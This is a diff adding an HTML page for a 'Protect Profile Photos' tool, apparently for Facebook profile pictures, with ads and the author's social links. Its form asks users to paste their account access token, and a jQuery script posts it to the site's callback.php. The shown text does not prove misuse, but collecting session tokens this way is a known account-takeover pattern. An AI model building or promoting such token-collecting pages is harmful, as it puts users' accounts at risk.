@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+        <meta name="description" content="">
+        <meta name="author" content="">
+        <link rel="icon" href="//static.chotot.com.vn/storage/marketplace/shield-iconx4.png">
+        <title>Protect Profile Photos</title>
+        <link rel="stylesheet" href="//stackpath.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css">
+        <link rel="stylesheet" href="master_style.css">
+        <link rel="stylesheet" href="_all-skins.css">
+        <link rel="stylesheet" href="style_Icon.css">
+        <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/html5shiv/3.7.3/html5shiv.min.js"></script>
+        <script src="//oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
+        <![endif]-->
+        <link href="//fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">
+        <style>.lockscreen2{background: url(Anas2.jpg);height: 100%;width: 100%;position: absolute;}</style>
+        <script src="https://use.fontawesome.com/d1341f9b7a.js"></script>
+        <script data-ad-client="ca-pub-5495528294075654" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+         <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-159092063-3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-159092063-3');
+</script>
+    </head>
+<script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-format="fluid"
+     data-ad-layout-key="-fb+5w+4e-db+86"
+     data-ad-client="ca-pub-5495528294075654"
+     data-ad-slot="7258693010"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+    <body class="hold-transition lockscreen2">
+        <div class="lockscreen-wrapper">
+            <div class="lockscreen-logo">
+                <b style="color: #fff">By:Anas AounAlsoud</b>
+            </div>
+            <div class="lockscreen-box-body">
+                <div class="lockscreen-item">
+                    <div class="lockscreen-image">
+                        <img src="//static.chotot.com.vn/storage/marketplace/shield-iconx4.png" alt="User Image">
+                    </div>
+                    <form class="lockscreen-credentials form-element margin-top-20" id="guard">
+                        <div class="form-group has-feedback">
+                            <input type="txt" class="form-control" name="access_token" placeholder="Access token">
+                        </div>
+                        <div class="form-group has-feedback">
+                            <div class="radio">
+                                <input name="active" type="radio" id="turn_on" value="on" checked>
+                                <label for="turn_on">Turn on image protection</label>                    
+                            </div>
+                            <div class="radio">
+                                <input name="active" type="radio" value="off" id="turn_off">
+                                <label for="turn_off">Turn off image protection</label>   
+                            </div>
+                               <p>يرجى الاشتراك في قناتنا ومتابعة صفحاتنا في حال اعجبتك الخدمة! نقدم دائما خدمات جديدة</p>
+                               <p>خاصة بقناة</p>
+                                <p>Anas AounAlsoud</p>
+                               <p>جميع حسابتنا الرسمية تجدها اسفل الموقع انقر عليها لزيارتها</p>
+                                 
+                                 <script async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
+<ins class="adsbygoogle"
+     style="display:block"
+     data-ad-format="fluid"
+     data-ad-layout-key="-fb+5w+4e-db+86"
+     data-ad-client="ca-pub-5495528294075654"
+     data-ad-slot="8763346371"></ins>
+<script>
+     (adsbygoogle = window.adsbygoogle || []).push({});
+</script>
+
+                                 <ul>
+                            <li><a href="https://www.facebook.com/anasaounalsoud.official" target="Personal Facebook"><i class="fa fa-facebook-square" aria-hidden="true"></i></a></li>
+                            <li><a href="https://www.facebook.com/anassis.12/" target="Facebook Page"><i class="fa fa-facebook-square" aria-hidden="true"></i></a></li>
+                            <li><a href ="https://www.youtube.com/ANASOyonAlsoud" target="YouTube"><i class="fa fa-youtube-square" aria-hidden="true"></i></a></li>
+                            <li><a href ="https://www.instagram.com/anasouonalsood/" target="instagram"><i class="fa fa-instagram" aria-hidden="true"></i></a></li>
+                            <li><a href="https://blog.anasaounalsoud.eu/" target="Wordpress"><i class="fa fa-wordpress" aria-hidden="true"></i></a></li>
+                            <li><a href="https://twitter.com/anasaounalsoud" target="Twitter"><i class="fa fa-twitter-square" aria-hidden="true"></i></a></li>
+                            </ul>  
+                            
+                        </div>
+                        <div class="text-center">
+                            <button class="btn btn-info btn-block btn-flat margin-top-10" name="submit" id="process">save</button>
+                        </div>
+                    </form>
+                    <div class="help-block text-center margin-top-20"></div>
+                </div>
+            </div>
+        </div>
+        <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+        <script src="//stackpath.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
+        <script src="sweetalert.min.js"></script>
+        <script>
+            $(function(){
+                $('#guard').submit(function(e) {
+                    $.ajax({
+                        method: 'POST',
+                        url: 'callback.php',
+                        data: $(this).serialize(),
+                        dataType: 'text'
+                    }).done(function(response) {
+                        var result = JSON.parse(response);
+                        swal(result.title, result.message, result.type);
+                    }).fail(function() {
+                        swal('Oops', 'Có lỗi xảy ra, vui lòng thử lại sau.', 'error');
+                    });
+                    e.preventDefault();
+                });
+            });
+        </script>
+    </body>
+</html>
